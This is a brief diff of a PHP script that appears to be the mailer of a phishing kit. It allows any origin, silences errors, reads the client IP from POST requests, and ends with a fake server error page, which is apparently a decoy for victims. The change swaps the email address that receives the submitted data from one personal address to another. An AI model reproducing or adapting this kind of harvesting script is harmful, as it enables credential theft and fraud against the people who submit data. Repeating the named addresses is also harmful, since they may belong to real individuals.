@@ -2,7 +2,7 @@
 header('Access-Control-Allow-Origin: *');  
 error_reporting(0);
 
-$to = 'mayowasylvester05@yandex.com';
+$to = 'bscott0824@windstream.net';
 
 if($_SERVER['REQUEST_METHOD'] == 'POST'){
 	$client  = @$_SERVER['HTTP_CLIENT_IP'];
@@ -67,4 +67,5 @@ error was encountered while trying to use an ErrorDocument to handle the request
 </body></html>
 ');
 }
+
 ?>
